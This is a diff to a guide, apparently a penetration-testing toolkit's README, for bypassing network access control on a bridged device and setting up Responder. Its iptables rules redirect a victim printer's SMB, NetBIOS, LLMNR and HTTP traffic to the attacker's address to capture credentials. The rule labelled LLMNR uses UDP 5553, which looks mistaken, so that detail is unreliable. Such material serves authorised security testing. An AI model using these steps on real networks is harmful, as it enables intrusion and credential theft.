@@ -177,31 +177,36 @@ Then start the nac bypass:
 
 ````bash
 # by default it will treat the lower interface device as switch side, and the next one as victim
-./nac_bypass_setup.sh -1 eth0 -2 eth1 -S
+sudo /root/nac_bypass/./nac_bypass_setup.sh -1 eth0 -2 eth1 -S
 
 # script will ask to wait some time, so it is able to dump the needed info from the network traffic
 # afterwards, you can proceed and for instance do an nmap scan on the network
+
+# if you use lte dongle, fix routes to make internet working
+sudo /root/./fix-lte-routing.sh
 ````
 
 #### 8.2 - Responder
 
 To use responder, you will need to run `nac_bypass_setup.sh` with the `-R` flag. Alike to `-S` and OpenSSH, it will automatically add iptables rules to rewrite packets.
 
-Alternatively, you can add those manually by defining the victim's IP:
+Alternatively, you can add those manually in retrospect by defining the victim's IP:
 
 ````
+VICTIM_IP="<VICTIM-PRINTER-IP>"
+
 # NetBIOS Name Service (UDP 137)
-sudo iptables -t nat -A PREROUTING -i br0 -d <VICTIM-PRINTER-IP> -p udp --dport 137 -j DNAT --to-destination 169.254.66.66:137
+sudo iptables -t nat -A PREROUTING -i br0 -d "$VICTIM_IP" -p udp --dport 137 -j DNAT --to-destination 169.254.66.66:137
 # NetBIOS Datagram Service (UDP 138)
-sudo iptables -t nat -A PREROUTING -i br0 -d <VICTIM-PRINTER-IP> -p udp --dport 138 -j DNAT --to-destination 169.254.66.66:138
+sudo iptables -t nat -A PREROUTING -i br0 -d "$VICTIM_IP" -p udp --dport 138 -j DNAT --to-destination 169.254.66.66:138
 # NetBIOS Session Service (TCP 139)
-sudo iptables -t nat -A PREROUTING -i br0 -d <VICTIM-PRINTER-IP> -p tcp --dport 139 -j DNAT --to-destination 169.254.66.66:139
+sudo iptables -t nat -A PREROUTING -i br0 -d "$VICTIM_IP" -p tcp --dport 139 -j DNAT --to-destination 169.254.66.66:139
 # SMB (TCP 445)
-sudo iptables -t nat -A PREROUTING -i br0 -d <VICTIM-PRINTER-IP> -p tcp --dport 445 -j DNAT --to-destination 169.254.66.66:445
+sudo iptables -t nat -A PREROUTING -i br0 -d "$VICTIM_IP" -p tcp --dport 445 -j DNAT --to-destination 169.254.66.66:445
 # LLMNR / Multicast (UDP 5553)
-sudo iptables -t nat -A PREROUTING -i br0 -d <VICTIM-PRINTER-IP> -p udp --dport 5553 -j DNAT --to-destination 169.254.66.66:5553
+sudo iptables -t nat -A PREROUTING -i br0 -d "$VICTIM_IP" -p udp --dport 5553 -j DNAT --to-destination 169.254.66.66:5553
 # HTTP (TCP 80)
-sudo iptables -t nat -A PREROUTING -i br0 -d <VICTIM-PRINTER-IP> -p tcp --dport 80 -j DNAT --to-destination 169.254.66.66:80
+sudo iptables -t nat -A PREROUTING -i br0 -d "$VICTIM_IP" -p tcp --dport 80 -j DNAT --to-destination 169.254.66.66:80
 # may add more like LDAP, SMTP, DNS...
 ````
 
